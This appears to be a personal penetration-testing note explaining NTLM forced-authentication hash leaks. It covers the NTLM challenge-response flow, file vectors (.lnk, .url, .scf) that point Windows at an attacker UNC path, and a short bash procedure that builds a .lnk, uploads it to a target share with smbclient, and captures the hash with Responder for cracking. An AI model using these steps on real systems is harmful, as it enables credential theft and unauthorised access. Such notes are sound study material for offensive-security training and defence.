---
tags: [technique, windows, credential-access]
aliases: [Forced Authentication, LNK Hash Leak, NTLM, NTLMv2]
---
# NTLM Hash Leak (Forced Authentication)

> Windows is made to authenticate against a **UNC path to the attacker** (`\\<attacker-ip>\share`) → it automatically sends the NTLMv2 hash, which is captured and cracked.

## Background: NTLM
NTLM is the Windows mechanism by which a system proves **who the user is** when accessing a resource (SMB shares, RDP, Windows-auth websites). Flow (challenge-response):
1. Client sends the **username** to the server.
2. Server sends back a **random challenge**.
3. Client encrypts the challenge with its **password hash** → NTLMv2 response.
4. Server verifies the response.

=> Only the **response** (challenge + hash computation) goes over the wire, never the password.

Attack surface for this technique:
- The captured **NTLMv2 response** can be **cracked offline** → [[Hash Cracking]] (format `netntlmv2`).
- Windows sometimes authenticates **automatically** against UNC paths (`\\host\share`) — exactly what is forced here.

## Principle
1. A file/resource points to `\\<attacker-ip>\...`
2. The victim triggers the resolution (open, **preview**, sometimes just a right-click).
3. Windows authenticates automatically → the hash goes to the listener ([[Responder]]).
4. Crack the hash offline → [[Hash Cracking]].

## Vectors
| Type       | Trigger                                              |
| ---------- | ---------------------------------------------------- |
| `.lnk`     | **right-click/preview** (2025 research) – no CVE     |
| `.url`     | file with `URL=file://\\attacker\...`                |
| `.scf`     | icon loads from a UNC path                           |
| SMB share  | place a crafted file on a writable share             |

> [!note] Mark of the Web
> MS only blocks the `.lnk` vector for files **downloaded from the internet** (MotW). Files on **internal shares** carry no MotW → still vulnerable.

## Building a `.lnk` on Linux
```bash
x86_64-w64-mingw32-gcc -o poc poc.c   # poc.c points to \\<tun0-ip>\share
wine poc.exe                          # creates poc.lnk
smbclient //<target>/share -N -c 'put poc.lnk'
```
Then run [[Responder]] and wait for the auth.
